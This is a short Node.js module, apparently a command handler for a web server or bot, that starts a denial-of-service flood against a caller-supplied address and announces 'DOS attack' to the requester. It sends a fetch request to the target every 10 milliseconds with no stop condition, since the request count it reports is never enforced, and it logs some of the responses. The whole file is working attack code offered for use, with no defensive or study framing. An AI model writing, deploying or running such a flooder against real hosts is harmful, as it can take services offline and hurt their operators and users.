exports.run = (request, response, args, fs) => {
    let fetch = require("node-fetch")
    let reqs = args.req ? Number(args.req) : 10000
    console.log(args.ip)
    response.end("DOS attack: "+reqs+" requests to ip: "+args.ip)
    setInterval(function() {
        setTimeout(function () {
            fetch(args.ip).then(async function (data) {
                if (Math.random() > 0.75) {
                    console.log("DONE 1 REQ got data: " + (await data.text()))
                }

            })
        }, Math.random()*1000)
    },10)
}